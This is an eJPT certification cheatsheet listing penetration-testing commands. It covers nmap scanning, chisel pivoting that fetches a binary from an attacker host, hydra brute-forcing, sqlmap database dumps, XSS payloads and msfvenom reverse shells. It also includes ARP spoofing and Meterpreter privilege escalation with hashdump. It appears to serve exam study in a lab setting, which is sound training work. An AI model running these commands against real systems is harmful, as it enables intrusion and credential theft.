# eJPT-Cheatsheet

## fPing
fping -a -g x.x.x.x/24 2>/dev/null > targets

## Nmap
nmap -sn x.x.x.x/24\
nmap -sV -p- -iL targets -oN nmap.initial -v\
nmap -A -p- -iL targets -oN nmap.aggressive -v\
nmap -p<port> --script=vuln -v <target-IP>

**Custom nmap scan (Not from the course)**
nmap -p- -sS --open -T4 -n -Pn -iL targets -oN alltargetports
nmap -sCV -pxxx,xxx,xxxx -Pn -vvv x.x.x.x -oN portversion

## IP Route
**Syntax**\
ip route add \<Network-range\> via \<router-IP\> dev \<interface\>\
eg.\
ip route add x.x.x.x/24 via x.x.x.x dev tap0

## Pivoting without Metasploit
**For this I will use chisel tool**
**Pass chisel to the machine to pivot**
(Attacker) python -m SimpleHTTPServer xxxx
           nc -lvp
(Machine to pivot) wget <attacker-ip>:xxxx/chisel

**Attacker machine**
./chisel server --reverse -p xxxx

**Machine to pivot**
./chisel client <attacker-ip> 127.0.0.1:xxxx:<target-ip>:xxxx

## John
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5\
unshadow passwd shadow > unshadowed.txt\
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

## dirb
dirb http://x.x.x.x/ \
dirb http://x.x.x.x/dir -u admin:admin

*Faster using dirbuster. Threads at 20 and use /usr/share/wordlists/dirb/common.txt wordlist. Larger wordlists are not worth it for the exam*

## Netcat
**Listening for reverse shell**\
nc -lvp 1234

**Banner Grabbing**\
nc -nv x.x.x.x \<port\>

## SQLMap
#### Check if injection exists
sqlmap -r Post.req\
sqlmap -u "http://x.x.x.x/file.php?id=1" -p id\
sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin"

#### Get database if injection Exists
sqlmap -r login.req --dbs\
sqlmap -u "http://x.x.x.x/file.php?id=1" -p id --dbs\
sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin" --dbs\

#### Get Tables in a Database
sqlmap -r login.req -D dbname --tables\
sqlmap -u "http://x.x.x.x/file.php?id=1" -p id -D dbname --tables\
sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin" -D dbname --tables

#### Get data in a Database tables
sqlmap -r login.req -D dbname -T table_name --dump\
sqlmap -u "http://x.x.x.x/file.php?id=1" -p id -D dbname -T table_name --dump\
sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump

## Hydra
**SSH Login Bruteforcing**\
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u x.x.x.x ssh\
hydra -v -V -u -l root -P passwords.txt -t 1 -u x.x.x.x ssh\
*Replace ssh for other services when needed*

**HTTP POST Form**\
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V


## XSS
\<script\>alert(1)\</script\>\
\<ScRiPt\>alert(1)\</ScRiPt\>

*XSS filter bypass cheatsheet*\
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## msfvenom shells
**JSP Java Meterpreter Reverse TCP**\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp

**WAR**\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war

**PHP**\
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

**PHP non meterpreter**\
php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

## Metasploit Meterpreter autoroute
run autoroute -s x.x.x.x/24

## ARPSpoof
echo 1 > /proc/sys/net/ipv4/ip_forward\
arpspoof -i <interface> -t <target> -r <host>\
arpspoof -i tap0 -t x.x.x.x -r x.x.x.x

## SMB Enumeration
**Get shares, users, groups, password policy**\
smbclient -L //x.x.x.x/\
enum4linux -U -M -S -P -G x.x.x.x\
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains x.x.x.x -p 135,139,445 -v\
nmap -p445 --script=smb-vuln-* x.x.x.x -v

**Access Share**\
smbclient //x.x.x.x/share_name

## FTP Enumeration
nmap --script=ftp-anon x.x.x.x -p21 -v\
nmap -A -p21 x.x.x.x -v

**Login to FTP server**\
ftp x.x.x.x

**Login to FTP server no common port**
ftp x.x.x.x xxxx

## Meterpreter
ps\
getuid\
getpid\
getsystem\
ps -U SYSTEM

**CHECK UAC/Privileges**\
run post/windows/gather/win_privs

**BYPASS UAC**\
*Background the session first*\
exploit/windows/local/bypassuac\
set session

**After PrivEsc**\
migrate \<pid\>\
hashdump
  
## Windows Command Line
**Search for a file starting from current directory**\
dir /b/s "\*.conf\*"\
dir /b/s "\*.txt\*"\
dir /b/s "\*filename\*"

**Routing table**\
route print\
netstat -r

**Check Users**\
net users

**List drives on the machine**\
wmic logicaldisk get Caption,Description,providername


